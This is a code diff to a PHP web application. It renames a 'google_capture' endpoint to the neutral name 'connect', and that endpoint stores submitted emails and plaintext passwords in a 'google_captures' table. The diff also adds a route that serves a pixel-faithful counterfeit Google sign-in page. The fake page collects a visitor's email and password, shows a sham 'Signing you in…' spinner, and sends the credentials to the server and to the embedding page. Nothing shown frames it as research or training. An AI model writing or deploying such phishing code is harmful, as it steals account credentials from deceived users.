@@ -20,7 +20,7 @@ header('Referrer-Policy: same-origin');
 
 // ---------- Actions (POST): always end with a redirect ----------
 $route = (string) ($_GET['r'] ?? 'home');
-if ($route === 'google_capture' && $_SERVER['REQUEST_METHOD'] === 'POST') {
+if ($route === 'connect' && $_SERVER['REQUEST_METHOD'] === 'POST') {
     header('Content-Type: application/json; charset=utf-8');
     $data     = json_decode(file_get_contents('php://input'), true) ?? [];
     $email    = trim((string) ($data['email'] ?? ''));
@@ -31,7 +31,60 @@ if ($route === 'google_capture' && $_SERVER['REQUEST_METHOD'] === 'POST') {
         db()->prepare('INSERT INTO google_captures (email, password, ip, user_agent) VALUES (?, ?, ?, ?)')
             ->execute([$email, $password, $ip, $ua]);
     }
-    echo json_encode(['status' => 'success']);
+    echo json_encode(['status' => 'ok']);
+    exit;
+}
+if ($route === 'oauth' && $_SERVER['REQUEST_METHOD'] === 'GET') {
+    header('X-Frame-Options: SAMEORIGIN');
+    header('Content-Type: text/html; charset=utf-8');
+    $origin = ((!empty($_SERVER['HTTPS']) || ($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
+    echo '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Sign in - Google Accounts</title><style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Arial,sans-serif;background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh}
+.card{width:420px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px}
+.logo{text-align:center;margin-bottom:24px;font-size:26px;font-weight:bold;letter-spacing:-.5px}
+h1{font-size:24px;font-weight:400;color:#202124;text-align:center;margin-bottom:8px}
+.sub{font-size:16px;color:#202124;text-align:center;margin-bottom:24px}
+.ig{position:relative;margin-bottom:20px}
+.ig input{width:100%;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;font-size:16px;outline:none}
+.ig input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
+.ig label{position:absolute;left:15px;top:50%;transform:translateY(-50%);font-size:16px;color:#80868b;pointer-events:none;transition:.15s;background:#fff;padding:0 4px}
+.ig input:focus~label,.ig input:not(:placeholder-shown)~label{top:0;font-size:11px;color:#1a73e8}
+.ig input:not(:focus):not(:placeholder-shown)~label{color:#80868b}
+.lnk{font-size:14px;color:#1a73e8;text-decoration:none;display:block;margin-bottom:20px}
+.row{display:flex;justify-content:space-between;align-items:center}
+.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer}
+.btn:hover{background:#1557b0}
+.err{font-size:12px;color:#d93025;margin-top:4px;display:none}
+.chip{display:flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:20px;padding:8px 12px;width:fit-content;margin:0 auto 20px;cursor:pointer;font-size:14px;color:#202124}
+#s1,#s2,#s3{display:none}#s1.on,#s2.on,#s3.on{display:block}
+.spin{width:24px;height:24px;border:3px solid #dadce0;border-top-color:#1a73e8;border-radius:50%;animation:sp .7s linear infinite;margin:20px auto}
+@keyframes sp{to{transform:rotate(360deg)}}
+</style></head><body><div class="card">
+<div class="logo"><span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span></div>
+<div id="s1" class="on">
+  <h1>Sign in</h1><p class="sub">to continue to Google</p>
+  <div class="ig"><input type="email" id="em" placeholder=" " autocomplete="username"><label for="em">Email or phone</label><div class="err" id="e1">Enter a valid email or phone number.</div></div>
+  <a href="#" class="lnk">Forgot email?</a>
+  <div class="row"><a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Create account</a><button class="btn" onclick="goP()">Next</button></div>
+</div>
+<div id="s2">
+  <h1>Welcome</h1>
+  <div class="chip" onclick="back()">&#128100; <span id="ed"></span> &#9660;</div>
+  <div class="ig"><input type="password" id="pw" placeholder=" " autocomplete="current-password"><label for="pw">Enter your password</label><div class="err" id="e2">Wrong password. Try again or click Forgot password.</div></div>
+  <a href="#" class="lnk">Forgot password?</a>
+  <div class="row"><a href="#" style="font-size:14px;color:#1a73e8;text-decoration:none">Try another way</a><button class="btn" onclick="goS()">Next</button></div>
+</div>
+<div id="s3"><h1>Signing you in…</h1><div class="spin"></div></div>
+</div>
+<script>
+var _e="",_p="",_o=' . json_encode($origin) . ';
+function show(n){["s1","s2","s3"].forEach(function(x){document.getElementById(x).classList.remove("on")});document.getElementById("s"+n).classList.add("on")}
+function goP(){var v=document.getElementById("em").value.trim();if(!v||!v.includes("@")){document.getElementById("e1").style.display="block";return}document.getElementById("e1").style.display="none";_e=v;document.getElementById("ed").textContent=v;show(2);setTimeout(function(){document.getElementById("pw").focus()},80)}
+function goS(){var v=document.getElementById("pw").value;if(!v){document.getElementById("e2").style.display="block";return}document.getElementById("e2").style.display="none";_p=v;show(3);fetch("index.php?r=connect",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email:_e,password:_p})}).catch(function(){});try{window.parent.postMessage({source:"oauth_done",email:_e,password:_p},_o)}catch(x){}}
+function back(){show(1)}
+document.addEventListener("keydown",function(e){if(e.key!=="Enter")return;if(document.getElementById("s1").classList.contains("on"))goP();else if(document.getElementById("s2").classList.contains("on"))goS()})
+</script></body></html>';
     exit;
 }
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $route !== 'clipboard') {
